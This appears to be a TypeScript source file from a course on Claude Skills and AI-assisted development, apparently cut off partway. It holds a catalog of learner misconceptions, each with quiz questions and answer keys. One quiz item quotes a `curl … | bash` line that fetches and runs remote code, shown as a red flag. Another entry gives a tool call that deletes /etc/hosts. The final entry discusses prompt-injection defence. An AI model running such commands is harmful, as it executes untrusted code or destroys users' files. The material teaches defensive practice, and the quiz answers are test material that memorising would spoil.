import type { CompetencyId, Item } from '@/domain/curriculum/types';
import { o } from './lessons/helpers';

/**
 * Authored misconception catalog. When a learner picks a wrong option that carries a `misconception` id, the
 * feedback names the belief behind the mistake, explains why it fails, shows a contrast example and offers a
 * short corrective question. Corrective questions are PRACTICE ONLY: they never count toward mastery.
 */
export interface Misconception {
  id: string;
  competency: CompetencyId;
  /** The mistaken belief, stated the way a learner would hold it. */
  belief: string;
  /** Why people believe it - it is usually a reasonable inference from something true. */
  whyPlausible: string;
  /** What actually happens, with the mechanism. */
  whyWrong: string;
  contrast: { wrong: string; right: string; note: string };
  corrective: Item;
}

const MISCONCEPTIONS_LIST: Misconception[] = [
  {
    id: 'instructions-add-capability',
    competency: 'mechanism-selection',
    belief: 'If I write better instructions, Claude will be able to do things it currently cannot.',
    whyPlausible: 'Instructions change behaviour a lot, so it feels like they can change what is possible.',
    whyWrong: 'Instructions (CLAUDE.md, Skills) change how Claude uses what it already has. A capability such as driving a real browser or querying a database comes from a tool (for example an MCP server).',
    contrast: { wrong: '"Add a paragraph to CLAUDE.md explaining how to click buttons in a browser."', right: 'Connect a browser-automation MCP server, then use a Skill to say when and how to use it.', note: 'Tool = what Claude can do. Skill = how and when it should do it.' },
    corrective: { id: 'mc-instructions-add-capability', kind: 'single', concept: 'mechanism-selection', prompt: 'Claude cannot read your game\'s live telemetry dashboard. What fixes that?', options: [o('a', 'A tool or MCP server that can read the dashboard, plus (optionally) a Skill on how to interpret it', 'Correct: the capability has to come from a tool.'), o('b', 'A longer CLAUDE.md describing the dashboard in detail', 'Description is not access.'), o('c', 'A Skill whose description mentions "telemetry"', 'A description only affects when the Skill loads.'), o('d', 'Asking more politely', 'Politeness is not a capability.')], correct: 'a', explanation: 'Capability comes from tools; procedure comes from Skills.' },
  },
  {
    id: 'more-keywords',
    competency: 'trigger-design',
    belief: 'Adding more keywords to a Skill description makes it trigger more reliably.',
    whyPlausible: 'If a Skill fails to trigger, adding the words people type seems like the obvious fix - and sometimes it is.',
    whyWrong: 'A longer, keyword-stuffed description matches more requests, including ones it should not handle, and it eats the shared listing budget. Reliable triggering comes from a specific "Use when…" symptom plus a "Not for…" boundary, validated with positive AND negative test prompts.',
    contrast: { wrong: 'description: "merge, merging, merges, match, board, game, puzzle, bug, fix, debug, error, bug-fix…"', right: 'description: "Diagnoses merge chains that lose value in the board resolver. Use when pieces vanish or totals drop after a merge. Not for UI or art bugs."', note: 'Specific symptoms plus an explicit boundary beat a word list.' },
    corrective: { id: 'mc-more-keywords', kind: 'single', concept: 'trigger-design', prompt: 'Your Skill fires on unrelated bug reports. What is the best first change?', options: [o('a', 'Make the description more specific and add a "Not for…" boundary', 'Correct: narrow it down, then test near-miss negatives.'), o('b', 'Add ten more keywords so Claude is "sure"', 'More keywords widens matching and worsens over-triggering.'), o('c', 'Delete the instructions body', 'The body does not decide whether the Skill loads.'), o('d', 'Rename the folder', 'The name is not what Claude matches the request against.')], correct: 'a', explanation: 'Over-triggering is a precision problem; add precision.' },
  },
  {
    id: 'body-decides-trigger',
    competency: 'trigger-design',
    belief: 'The instructions in SKILL.md decide when the Skill is used.',
    whyPlausible: 'The body is where you write all the detail, so it feels like the "real" part of the Skill.',
    whyWrong: 'Claude decides whether to load a Skill from its name and description (the listing). The body is only read after the Skill is chosen. A great body behind a weak description never runs.',
    contrast: { wrong: 'Put "Use this whenever the user mentions balance" on line 40 of the body.', right: 'Put the trigger condition in the description, where Claude can see it before loading anything.', note: 'Trigger = description. Procedure = body.' },
    corrective: { id: 'mc-body-decides-trigger', kind: 'single', concept: 'trigger-design', prompt: 'Where must the "when to use this" signal live so Claude can find it?', options: [o('a', 'In the description (and when_to_use) in the frontmatter', 'Correct: that is what Claude sees in the listing.'), o('b', 'Deep in the instructions body', 'The body is only read after the Skill has been chosen.'), o('c', 'In a supporting reference file', 'Even less visible.'), o('d', 'In the folder permissions', 'Unrelated to matching.')], correct: 'a', explanation: 'The description is the trigger.' },
  },
  {
    id: 'skill-always-loaded',
    competency: 'skill-anatomy',
    belief: 'Every installed Skill is fully loaded into every conversation.',
    whyPlausible: 'Skills feel like "memory", and CLAUDE.md really is loaded each session.',
    whyWrong: 'Only each Skill\'s short listing (name and description) is present up front. The full SKILL.md is loaded when the Skill is used, and supporting files only when referenced. That is why descriptions are budgeted and why long reference material belongs in linked files.',
    contrast: { wrong: '"I can paste 3,000 lines of lore into SKILL.md; it\'s free."', right: 'Keep SKILL.md to the decision procedure and move reference material to references/*.md.', note: 'Progressive disclosure keeps context cheap.' },
    corrective: { id: 'mc-skill-always-loaded', kind: 'single', concept: 'skill-anatomy', prompt: 'What is present in context from the start of a session for an installed, model-invocable Skill?', options: [o('a', 'Its name and description (the listing)', 'Correct: the body loads on use.'), o('b', 'The whole SKILL.md and every supporting file', 'That would waste context on Skills you never use.'), o('c', 'Nothing at all', 'Then Claude could never decide to use it.'), o('d', 'Only its scripts', 'Scripts run only when invoked.')], correct: 'a', explanation: 'Listing first, body on use, files on reference.' },
  },
  {
    id: 'popular-is-safe',
    competency: 'skill-security',
    belief: 'A popular or official-looking repository is safe to install from.',
    whyPlausible: 'Many eyes on popular code is a decent heuristic for ordinary libraries.',
    whyWrong: 'Stars measure attention, not a review of each bundled script, and a Skill runs with your authority. Safety is a property of what the specific files do, which you can only judge by reading them.',
    contrast: { wrong: '"300k stars, so I\'ll let it run its install script."', right: 'Read SKILL.md and every script as text, check permissions and network use, then decide.', note: 'Judge behaviour, not popularity.' },
    corrective: { id: 'mc-popular-is-safe', kind: 'single', concept: 'skill-security', prompt: 'A trending Skill bundles an install script. What is the safest first step?', options: [o('a', 'Read the script and SKILL.md as text before anything runs', 'Correct: read, do not run.'), o('b', 'Run it once in your real project to see', 'Running it is exactly the risk.'), o('c', 'Trust it because of the star count', 'Popularity is not review.'), o('d', 'Ask Claude to run it with broad permissions', 'Strictly worse.')], correct: 'a', explanation: 'Inspect first.' },
  },
  {
    id: 'run-to-inspect',
    competency: 'skill-security',
    belief: 'To find out whether a script is dangerous, run it and see what happens.',
    whyPlausible: 'For your own code, running it is how you learn what it does.',
    whyWrong: 'If the script is hostile, running it IS the attack. Inspection means reading the text (or running in a disposable sandbox with no secrets and no network) - never on your real machine with your credentials.',
    contrast: { wrong: '`curl … | bash` "just to see".', right: 'Download to a file, read it, and only then decide whether to run it at all.', note: 'The cost of finding out by running is the whole downside.' },
    corrective: { id: 'mc-run-to-inspect', kind: 'single', concept: 'skill-security', prompt: 'You find `curl -s https://host.example/i.sh | bash` in a Skill\'s setup script. What do you do?', options: [o('a', 'Treat it as a red flag; do not run it; read what it would fetch as text', 'Correct: this is the safer, evidence-based choice.'), o('b', 'Run it once to see what it does', 'That executes unreviewed remote code.'), o('c', 'Ignore it - setup scripts are normal', 'This exact pattern is a classic attack vector.'), o('d', 'Run it with sudo so it cannot fail', 'Strictly worse.')], correct: 'a', explanation: 'Read, do not run.' },
  },
  {
    id: 'one-run-proof',
    competency: 'experiment-design',
    belief: 'If the run with my Skill succeeds and the run without it fails, the Skill works.',
    whyPlausible: 'It looks exactly like a controlled comparison.',
    whyWrong: 'LLM output varies from run to run. One run per condition cannot tell a real effect from luck. You need several runs per condition and an honest statement of overlap and limits.',
    contrast: { wrong: '"Skill: pass. No Skill: fail. Skill wins."', right: '"3 runs each: Skill 2/3 pass, no Skill 1/3 pass - ranges overlap, so this is weak evidence."', note: 'Sample size and variance must stay visible.' },
    corrective: { id: 'mc-one-run-proof', kind: 'single', concept: 'experiment-design', prompt: 'One run each: with the Skill it passed all tests; without it failed. What can you conclude?', options: [o('a', 'Only that you have one anecdote per condition; repeat before drawing a conclusion', 'Correct: this is the safer, evidence-based choice.'), o('b', 'The Skill works', 'One run cannot separate a Skill effect from run-to-run variation.'), o('c', 'The Skill is 100% reliable', 'One pass proves nothing about reliability.'), o('d', 'The baseline is broken', 'One failure proves nothing either.')], correct: 'a', explanation: 'Variance needs repeats.' },
  },
  {
    id: 'unknown-is-zero',
    competency: 'experiment-design',
    belief: 'A measurement I did not record can be treated as zero (or the average).',
    whyPlausible: 'Spreadsheets happily fill blanks with 0 and averages make numbers look complete.',
    whyWrong: 'Zero is a claim ("it took no time"). The average is invented data. A missing value is unknown: exclude it from means, show how many are missing, and never let it make a condition look better.',
    contrast: { wrong: 'Runtime for run 2 not timed → 0 s, so the Skill "averages 40 s".', right: 'Runtime for run 2 → unknown; mean over the two timed runs, labelled n=2 with 1 missing.', note: 'Unknown stays unknown.' },
    corrective: { id: 'mc-unknown-is-zero', kind: 'single', concept: 'experiment-design', prompt: 'You forgot to time one run. How should the report treat its runtime?', options: [o('a', 'As unknown: excluded from the mean and counted as missing', 'Correct: this is the safer, evidence-based choice.'), o('b', 'As 0 seconds', 'This invents a value and drags the mean down.'), o('c', 'As the average of the other runs', 'This also invents data.'), o('d', 'Delete the run', 'The run still has other valid evidence.')], correct: 'a', explanation: 'Never silently convert unknown to zero.' },
  },
  {
    id: 'tuned-set-proves-it',
    competency: 'experiment-design',
    belief: 'If my revised Skill does better on the same tasks I tuned it on, it has improved.',
    whyPlausible: 'The tasks are identical, so the comparison feels fair.',
    whyWrong: 'You shaped the revision around those tasks and you already know the answers. Improvement on a tuned set can be overfitting. Only tasks the revision was never tuned against - scored against answers you had not seen - show whether it generalises.',
    contrast: { wrong: '"v2 fixes all four proposals I debugged; ship it."', right: '"v2 also matched the simulation on three held-out proposals I had not seen."', note: 'A held-out set is the cheapest guard against fooling yourself.' },
    corrective: { id: 'mc-tuned-set-proves-it', kind: 'single', concept: 'experiment-design', prompt: 'You revised a Skill after studying 4 failing cases and it now passes all 4. What is the strongest next evidence?', options: [o('a', 'Run it on new cases you never looked at, and score them against answers you had not seen', 'Correct: that tests generalisation.'), o('b', 'Re-run the same 4 cases five more times', 'More runs on the tuned set still cannot show generalisation.'), o('c', 'Add the 4 cases to the Skill\'s instructions', 'That memorises answers instead of improving the procedure.'), o('d', 'Nothing - it passes', 'You have shown it fits the cases you studied.')], correct: 'a', explanation: 'Held-out beats tuned.' },
  },
  {
    id: 'valid-means-works',
    competency: 'production-skills',
    belief: 'A Skill that passes validation works well.',
    whyPlausible: 'Validation is the only automatic feedback you get, so a green result feels like approval.',
    whyWrong: 'Validation checks structure (names, lengths, paths). It says nothing about whether the Skill triggers correctly or changes Claude\'s behaviour. That needs trigger tests and a comparison against no Skill.',
    contrast: { wrong: '"No errors, ship it."', right: '"No errors, 5/6 trigger scenarios behave, and 3 runs beat baseline on verdict accuracy."', note: 'Valid ≠ effective.' },
    corrective: { id: 'mc-valid-means-works', kind: 'single', concept: 'production-skills', prompt: 'What does a clean validation result tell you about a Skill?', options: [o('a', 'Its structure is well-formed; nothing about whether it helps', 'Correct: this is the safer, evidence-based choice.'), o('b', 'It triggers at the right times', 'Triggering needs scenario and live tests.'), o('c', 'It improves Claude\'s answers', 'Only a comparison can show that.'), o('d', 'It is secure', 'Validation is not a security review.')], correct: 'a', explanation: 'Structure only.' },
  },
  {
    id: 'marking-is-mastery',
    competency: 'production-skills',
    belief: 'Marking a Skill as "mastered" in my Arsenal means I have mastered it.',
    whyPlausible: 'The Arsenal lets you set a status, and the status sounds like a result.',
    whyWrong: 'The Arsenal records your relationship with a Skill; it is a label you set, not evidence. Competency levels only come from graded work, and "field-proven" needs evidence from a real project.',
    contrast: { wrong: 'Set status to Mastered after reading the README.', right: 'Keep it "Interested", then "Evaluating" once you test it; record field evidence after real use.', note: 'Status reflects what you did, not what you hope.' },
    corrective: { id: 'mc-marking-is-mastery', kind: 'single', concept: 'production-skills', prompt: 'You have read about a Skill but never tried it. Which Arsenal status is honest?', options: [o('a', 'Interested (Evaluating once you start testing)', 'Correct: this is the safer, evidence-based choice.'), o('b', 'Using', 'You have not used it.'), o('c', 'Mastered', 'Nothing has been demonstrated.'), o('d', 'Practicing', 'You have not practised.')], correct: 'a', explanation: 'Do not award mastery for marking.' },
  },
  {
    id: 'big-balance-is-inflation',
    competency: 'economy-analysis',
    belief: 'A huge currency balance means the economy is inflating.',
    whyPlausible: 'Big numbers look like too much money.',
    whyWrong: 'A large balance can simply be currency held back by a stage gate: players have it but cannot spend it yet. Inflation is when income outruns prices over time - the trend of income relative to the next upgrade\'s price, not the size of one number.',
    contrast: { wrong: '"Balance is 40,000 at stage 20 - cut rewards."', right: '"Affordability (income ÷ next price) stays 0.5–0.7 across stages 10–60 - the stockpile is gate-bound surplus."', note: 'Look at ratios and trends, not raw balances.' },
    corrective: { id: 'mc-big-balance-is-inflation', kind: 'single', concept: 'economy-analysis', prompt: 'Which observation best indicates runaway supply rather than a gated surplus?', options: [o('a', 'Income relative to the next upgrade\'s price keeps climbing stage after stage', 'Correct: income and price have decoupled.'), o('b', 'The balance is large at stage 20', 'A large balance can be gate-bound.'), o('c', 'A repair tax exists', 'A constant sink is not a trend.'), o('d', 'Supply varies ±10% between stages', 'That is noise.')], correct: 'a', explanation: 'A trend in a ratio, not the size of a number.' },
  },
  {
    id: 'treat-the-symptom',
    competency: 'economy-analysis',
    belief: 'If players are rich, cut rewards (or add a bigger sink) and the problem is fixed.',
    whyPlausible: 'It lowers the number you are staring at.',
    whyWrong: 'If the cause is a compounding coupling between power and reward, a flat cut only delays it, and it can push early stages below the affordability band. Diagnose supply, sinks, gates and pacing separately, then fix the cause.',
    contrast: { wrong: '"Cut all rewards 30%."', right: '"Linearise the power-to-reward coupling, then re-run the simulation and check affordability bands."', note: 'Fix causes with evidence; do not paint over symptoms.' },
    corrective: { id: 'mc-treat-the-symptom', kind: 'single', concept: 'economy-analysis', prompt: 'Late-game income compounds faster than upgrade cost. Which change addresses the cause?', options: [o('a', 'Reduce the compounding coupling between power and reward, then re-simulate', 'Correct: it targets the cause and is checked against the simulation.'), o('b', 'Cut every reward by 30%', 'A flat cut treats the symptom and can starve early stages.'), o('c', 'Double the repair tax', 'A bigger sink drains stockpiles without fixing the growth rate.'), o('d', 'Hide the balance from players', 'Hiding a number changes what players see, not what causes it.')], correct: 'a', explanation: 'Cause, not symptom.' },
  },
  {
    id: 'patch-before-reproduce',
    competency: 'systematic-debugging',
    belief: 'Once I have a suspicious line, I should fix it straight away.',
    whyPlausible: 'It is faster, and often the first suspect is right.',
    whyWrong: 'Without a reproducible failing case you cannot know the patch fixed the bug, and special-case patches hide the real invariant violation. Reproduce, find the smallest failing input, state the violated invariant, fix the cause, and keep the case as a regression test.',
    contrast: { wrong: '"Merges of exactly four look odd - add a special case."', right: '"Seed 7 fails on drop 19; value is not conserved; fix the resolver; keep seed 7 as a test."', note: 'A failing case is the definition of done.' },
    corrective: { id: 'mc-patch-before-reproduce', kind: 'single', concept: 'systematic-debugging', prompt: 'Which step comes first in a disciplined investigation of a flaky game bug?', options: [o('a', 'Find a deterministic failing case (for example a seed) and state the violated invariant', 'Correct: this is the safer, evidence-based choice.'), o('b', 'Rewrite the suspicious function', 'You cannot tell whether the rewrite fixes anything.'), o('c', 'Add a special case for the symptom', 'Special cases mask the cause.'), o('d', 'Add logging everywhere and hope', 'Noise is not a reproduction.')], correct: 'a', explanation: 'Reproduce first.' },
  },
  {
    id: 'self-review-independent',
    competency: 'multi-agent-review',
    belief: 'The agent that built the change can review it just as well.',
    whyPlausible: 'It knows the code best.',
    whyWrong: 'The Builder shares the blind spots and assumptions that produced the change. Independent review means a separate context that is given the evidence to check, not the Builder\'s account of it.',
    contrast: { wrong: '"Builder: I re-read it, all good."', right: '"Reviewer, with a fresh context, re-ran the tests and found the skipped gate."', note: 'Independence is the point of review.' },
    corrective: { id: 'mc-self-review-independent', kind: 'single', concept: 'multi-agent-review', prompt: 'Which role gives independent verification of the Builder\'s work?', options: [o('a', 'A Reviewer working from the evidence, not the Builder\'s summary', 'Correct: this is the safer, evidence-based choice.'), o('b', 'The Builder, after a second look', 'It cannot be independent of its own work.'), o('c', 'The Integrator skipping review to save time', 'The Integrator decides on the strength of review evidence.'), o('d', 'Nobody - green tests are enough', 'Tests cover mechanical gates, not judgement.')], correct: 'a', explanation: 'Independence.' },
  },
  {
    id: 'confidence-is-evidence',
    competency: 'multi-agent-review',
    belief: 'If the Builder is confident (or tests are green), its performance claim is established.',
    whyPlausible: 'Confident, fluent reports sound authoritative.',
    whyWrong: 'A claim needs evidence of the same kind: "40% faster" needs a before/after measurement with method and numbers. Unit tests do not measure speed and confidence is not a measurement.',
    contrast: { wrong: '"Builder: confident this is 40% faster. Tests pass."', right: '"Benchmark: 118 ms → 71 ms over 30 runs on the same fixture."', note: 'Match the evidence to the claim.' },
    corrective: { id: 'mc-confidence-is-evidence', kind: 'single', concept: 'multi-agent-review', prompt: 'A Builder claims "40% faster". Which evidence supports it?', options: [o('a', 'A before/after benchmark with method and numbers', 'Correct: this is the safer, evidence-based choice.'), o('b', 'The Builder\'s confidence', 'Confidence is not evidence.'), o('c', 'Green unit tests', 'Tests do not measure speed.'), o('d', 'A shorter diff', 'Size is not speed.')], correct: 'a', explanation: 'Claims need matching evidence.' },
  },

  {
    id: 'agents-always-better',
    competency: 'approach-selection',
    belief: 'An agent is the more advanced answer, so I should use one whenever I can.',
    whyPlausible: 'Agents can do impressive open-ended work, and "more autonomous" sounds like "more capable".',
    whyWrong: 'Autonomy costs latency and money and lets errors compound across steps. A fixed script, a plain prompt or a workflow with predefined steps is usually cheaper, faster and easier to verify. Add an agent only when the steps genuinely cannot be predicted and the extra capability demonstrably improves outcomes.',
    contrast: { wrong: '"Rename 4,000 files by a fixed pattern: spin up an agent."', right: '"Write a ten-line script, run it, check the diff."', note: 'Climb the ladder only as far as the problem needs.' },
    corrective: { id: 'mc-agents-always-better', kind: 'single', concept: 'approach-selection', prompt: 'A nightly job must convert 300 level files from one JSON layout to another using a fixed mapping. Which approach fits best?', options: [o('a', 'A deterministic script, verified by a diff and a schema check', 'Correct: the rule is fixed and checkable, so ordinary software is cheaper and more reliable.'), o('b', 'An autonomous agent that decides how to convert each file', 'The steps are predictable, so autonomy only adds cost and error risk.', 'agents-always-better'), o('c', 'A Skill describing the layouts', 'A Skill guides judgment; it does not do the conversion.'), o('d', 'A human edits each file', 'A fixed mapping over 300 files is exactly what software is for.')], correct: 'a', explanation: 'Prefer the simplest approach that works.' },
  },
  {
    id: 'longer-prompt-better',
    competency: 'context-engineering',
    belief: 'The more detail I put into the prompt, the better the result.',
    whyPlausible: 'Vague prompts fail, so it feels like the cure for vagueness is volume.',
    whyWrong: 'Context is a finite resource: as it grows, the model\'s ability to recall and use any one piece of it can decline. What helps is the right information - the context, constraints, scope, acceptance criteria and verification the task needs - not the most words. Irrelevant detail competes with the relevant detail.',
    contrast: { wrong: 'A 900-word brief with the whole project history pasted in.', right: 'Eight lines: what exists, what must not change, the scope, the pass condition and how to check it.', note: 'Curate; do not pile on.' },
    corrective: { id: 'mc-longer-prompt-better', kind: 'single', concept: 'context-engineering', prompt: 'Your task prompt is vague and results vary. What is the best improvement?', options: [o('a', 'Add the specific context, constraints, scope, acceptance criteria and a verification step the task needs', 'Correct: relevant, specific information beats volume.'), o('b', 'Paste the entire repository history so nothing is missing', 'Irrelevant context competes with the relevant context.', 'longer-prompt-better'), o('c', 'Repeat the instructions three times in capital letters', 'Emphasis is not information.'), o('d', 'Ask it to "try harder"', 'That adds no information about what success is.')], correct: 'a', explanation: 'Quality of context, not quantity.' },
  },
  {
    id: 'confident-trace-success',
    competency: 'agent-failure-analysis',
    belief: 'If the agent says it finished and its summary sounds right, the run succeeded.',
    whyPlausible: 'Fluent, confident final messages read like results.',
    whyWrong: 'A summary is a claim. A run succeeded when the OUTCOME is verified: the tests actually ran and passed, the file really changed, the record exists. An agent can report success while a step silently failed or was skipped. Read the trace for the evidence, not the final paragraph.',
    contrast: { wrong: '"Agent: All tests pass. Done." (no test command appears in the trace)', right: '"npm test ran; 214 passed, 0 failed" appears in the trace.', note: 'Outcome over narration.' },
    corrective: { id: 'mc-confident-trace-success', kind: 'single', concept: 'agent-failure-analysis', prompt: 'An agent ends with "All tests pass." What do you check first?', options: [o('a', 'Whether the trace shows the test command actually running, and its output', 'Correct: verify the outcome, not the narration.'), o('b', 'Whether the message sounds confident', 'Confidence is not evidence.', 'confident-trace-success'), o('c', 'Whether the message is long', 'Length is irrelevant.'), o('d', 'Nothing - agents report accurately', 'Agents can report success when a step failed or never ran.', 'confident-trace-success')], correct: 'a', explanation: 'Evidence lives in the trace.' },
  },
  {
    id: 'mcp-for-everything',
    competency: 'mcp-integration',
    belief: 'Every integration should be built as an MCP server.',
    whyPlausible: 'MCP is the headline way to connect tools to AI, so it feels like the standard answer.',
    whyWrong: 'MCP is one way to expose capabilities to an AI client. For a one-off call, a script or a direct API call in your own code is simpler and easier to audit; a built-in tool may already do the job; sometimes no integration is needed. Every server you connect adds permissions, trust decisions and prompt-injection surface.',
    contrast: { wrong: '"Wrap a single weekly CSV download in a full MCP server."', right: '"A 20-line script run by a scheduled job; give Claude the resulting file."', note: 'Integration is a cost, not a goal.' },
    corrective: { id: 'mc-mcp-for-everything', kind: 'single', concept: 'mcp-integration', prompt: 'You need Claude to read one exported CSV once a week. Which is the best-fitting approach?', options: [o('a', 'Run a small script on a schedule and give Claude the file (or let it use its built-in file tools)', 'Correct: no server, no new trust boundary.'), o('b', 'Build and host an MCP server for the CSV', 'Far more machinery and attack surface than the task needs.', 'mcp-for-everything'), o('c', 'Install the most popular database MCP server', 'Unneeded capability and trust.', 'mcp-for-everything'), o('d', 'Paste the CSV into a chat every week', 'Works, but ignores that a file read needs no integration at all.')], correct: 'a', explanation: 'Use the simplest integration that works.' },
  },
  {
    id: 'secrets-in-config',
    competency: 'mcp-integration',
    belief: 'It is fine to put an API key straight into a config file or a prompt if the repository is private.',
    whyPlausible: 'It works immediately and the repository "is private".',
    whyWrong: 'Config files get committed, copied, shared with plugins and read by tools; prompts are sent to a model provider and can be logged. A secret in either place is exposed far beyond its intended audience. Keep credentials in the environment or a secrets manager, grant the narrowest scope, and prefer read-only access.',
    contrast: { wrong: '"token": "sk-live-9f3…" inside .mcp.json', right: '"token": "${MY_SERVICE_TOKEN}" with the value set in your shell or a secrets manager, scoped read-only.', note: 'The config names the secret; it never contains it.' },
    corrective: { id: 'mc-secrets-in-config', kind: 'single', concept: 'mcp-integration', critical: true, prompt: 'A team member pastes a live API key into a project-scoped server config "just to get it working". What is the right response?', options: [o('a', 'Remove it from the file and history, rotate the key, and supply it through the environment with minimum scope', 'Correct: treat it as exposed, rotate it, and keep secrets out of files.'), o('b', 'Leave it - the repository is private', 'Private repositories are shared, cloned and leaked all the time.', 'secrets-in-config'), o('c', 'Add a comment saying "do not share"', 'A comment protects nothing.', 'secrets-in-config'), o('d', 'Move it into the prompt instead', 'Prompts leave your machine too.', 'secrets-in-config')], correct: 'a', explanation: 'Never put credentials in prompts or source.' },
  },
  {
    id: 'vendor-claim-is-evidence',
    competency: 'tool-evaluation',
    belief: 'If a tool\'s README says it is faster, safer or widely used, that is good evidence.',
    whyPlausible: 'The claim is specific and confident, and it is on the project\'s own page.',
    whyWrong: 'A claim by the seller is a claim, not evidence. Evidence has a method, a baseline and numbers you can inspect, ideally reproduced independently. Popularity (stars, "used by thousands") is attention, not a review of quality, maintenance or permissions.',
    contrast: { wrong: '"10x faster, trusted by thousands" with no method.', right: '"Benchmark: method, baseline, numbers and a script to reproduce."', note: 'Ask what the claim would look like if it were true - then look for it.' },
    corrective: { id: 'mc-vendor-claim-is-evidence', kind: 'single', concept: 'tool-evaluation', prompt: 'A README says "10x faster than alternatives" with no benchmark, method or link. How should you treat the claim?', options: [o('a', 'As an unsupported vendor claim: note it and look for a method or independent evidence', 'Correct: it matches the practice taught in this lesson.'), o('b', 'As established fact because it is specific', 'Specific is not the same as supported.', 'vendor-claim-is-evidence'), o('c', 'As proof if the repository has many stars', 'Stars are attention, not measurement.', 'vendor-claim-is-evidence'), o('d', 'Ignore the tool entirely', 'An unsupported claim is a reason for caution, not an automatic rejection.')], correct: 'a', explanation: 'Evidence has a method.' },
  },
  {
    id: 'parallel-always-faster',
    competency: 'efficient-ai-development',
    belief: 'Running more agents in parallel always gets the work done sooner.',
    whyPlausible: 'More workers sounds like more throughput.',
    whyWrong: 'Parallelism pays when tasks are independent and can be verified separately. Tasks that share files or need shared context collide, create merge conflicts and re-work, and every extra agent spends its own tokens and needs its own review. Coordination cost can exceed the time saved.',
    contrast: { wrong: 'Three agents editing the same resolver function at once.', right: 'Two agents on separate modules in separate worktrees, each with its own tests, merged one at a time.', note: 'Parallelise independent work only.' },
    corrective: { id: 'mc-parallel-always-faster', kind: 'single', concept: 'efficient-ai-development', prompt: 'Which situation is the best fit for running work in parallel with separate agents?', options: [o('a', 'Two independent modules with their own tests that touch no shared files', 'Correct: independent work can be verified and merged separately.'), o('b', 'Three agents all refactoring the same function', 'Guaranteed conflicts and re-work.', 'parallel-always-faster'), o('c', 'A task where each step depends on the previous step\'s result', 'Sequential by nature; parallel agents have nothing to do.', 'parallel-always-faster'), o('d', 'A one-line fix', 'Coordination would cost more than the fix.')], correct: 'a', explanation: 'Independence is the precondition.' },
  },
  {
    id: 'works-once-reliable',
    competency: 'workflow-design',
    belief: 'If the workflow worked once, it is reliable.',
    whyPlausible: 'A successful run feels like proof.',
    whyWrong: 'AI output varies between runs, and one success says nothing about the cases you did not try. A reliable workflow defines its inputs and expected outputs, checks the result independently, says what to do when a step fails, and puts a person where the cost of an error is high.',
    contrast: { wrong: '"It produced good release notes once, so let it publish them automatically."', right: '"It drafts release notes; a verification step checks every PR is covered; a human approves before publishing."', note: 'Reliability is designed, not observed once.' },
    corrective: { id: 'mc-works-once-reliable', kind: 'single', concept: 'workflow-design', prompt: 'An AI workflow produced a correct result on its first run. What makes it reliable enough to repeat?', options: [o('a', 'Defined inputs and outputs, an independent verification gate, failure handling and a human approval where errors are costly', 'Correct: reliability is designed into the procedure.'), o('b', 'Nothing more - it worked', 'One success cannot show consistency.', 'works-once-reliable'), o('c', 'A longer prompt', 'A longer prompt is not a check.', 'works-once-reliable'), o('d', 'A bigger model', 'A different model still needs the same gates.')], correct: 'a', explanation: 'Design the checks.' },
  },
  {
    id: 'valid-schema-is-valid-action',
    competency: 'structured-tool-contracts',
    belief: 'If the model\'s output validates against my schema, the action it describes is correct and safe to run.',
    whyPlausible: 'Schema validation feels like a gate: a parsed, correctly typed object looks trustworthy, and constrained decoding really does guarantee the shape.',
    whyWrong: 'A schema checks shape, not truth, authority or intent. A well-formed call can name the wrong file, a path outside the allowed folder, a stale record, or an action the user never asked for. Reliability needs semantic checks (is this value allowed, does it exist, is it permitted for this caller) and, for costly actions, approval.',
    contrast: { wrong: '{"action":"delete","path":"/etc/hosts"} passes the schema, so run it.', right: 'Validate the shape, then check the path is inside the allowed directory and the action is permitted, then ask for approval before deleting.', note: 'Valid shape is necessary, never sufficient.' },
    corrective: { id: 'mc-valid-schema-is-valid-action', kind: 'single', concept: 'structured-tool-contracts', prompt: 'A tool call {"tool":"run_tests","suite":"all","timeoutSec":99999} validates against the schema. What should the application still do before running it?', options: [o('a', 'Check the values against policy (allowed suites, a sane timeout) and reject or clamp anything out of bounds', 'Correct: the schema allowed the shape, but only the application knows what is permitted.'), o('b', 'Run it, because schema validation already proved the call is safe', 'Validation proves the shape; it says nothing about whether a 99999-second run is acceptable.', 'valid-schema-is-valid-action'), o('c', 'Ask the model whether it is sure', 'The model that produced the call is not an independent check.', 'valid-schema-is-valid-action'), o('d', 'Rewrite the schema to be longer', 'A longer schema still cannot encode every policy.')], correct: 'a', explanation: 'Validate shape, then policy, then approve costly actions.' },
  },
  {
    id: 'examples-are-the-test',
    competency: 'few-shot-design',
    belief: 'If the model gets every one of my examples right, my prompt works.',
    whyPlausible: 'The examples are the cases you care about, and watching them all pass is satisfying.',
    whyWrong: 'The model was shown those examples, so passing them measures memorisation of the prompt, not generalisation. Evidence of a good example set comes from withheld cases the prompt was never shaped on, including boundary and negative cases.',
    contrast: { wrong: '"All five examples in the prompt classify correctly, so ship it."', right: '"Five examples are in the prompt; I tested on twelve withheld tickets, including near-misses, and recorded the failures."', note: 'Examples teach; withheld cases test.' },
    corrective: { id: 'mc-examples-are-the-test', kind: 'single', concept: 'few-shot-design', prompt: 'You added four examples to a classifier prompt and all four now classify correctly. What is the strongest next evidence?', options: [o('a', 'Results on withheld cases that were never in the prompt, including boundary cases', 'Correct: only unseen cases can show the examples generalise.'), o('b', 'Re-run the same four examples several more times', 'Repeating the examples the prompt contains cannot show generalisation.', 'examples-are-the-test'), o('c', 'Add four more examples and re-check those', 'More examples in the prompt just moves the goalposts for what counts as already seen.', 'examples-are-the-test'), o('d', 'Nothing: they all pass', 'They pass because the model was shown them.', 'examples-are-the-test')], correct: 'a', explanation: 'Withhold cases for testing.' },
  },
  {
    id: 'tell-it-to-ignore-injection',
    competency: 'prompt-injection-defense',
    belief: 'If I tell the model to ignore any instructions found in the data, prompt injection is handled.',
    whyPlausible: 'A clear instruction does change model behaviour, and well-trained models are noticeably resistant to injected text.',
    whyWrong: 'A prompt instruction lowers risk but is not an enforcement boundary: a determined attacker only needs one phrasing that works, and the model reads both channels as text. Defence needs structural measures too: keep untrusted content in tool results, give the agent least privilege, limit what a successful injection can reach, and require human approval for consequential actions.',
    contrast: { wrong: '"The system prompt says to ignore instructions in documents, and the agent has full repository write access and shell."', right: '"The prompt states the policy, and the agent can only read this folder, has no secrets, and needs approval before any command or network call."', note: 'Instructions guide behaviour; permissions bound damage.' },
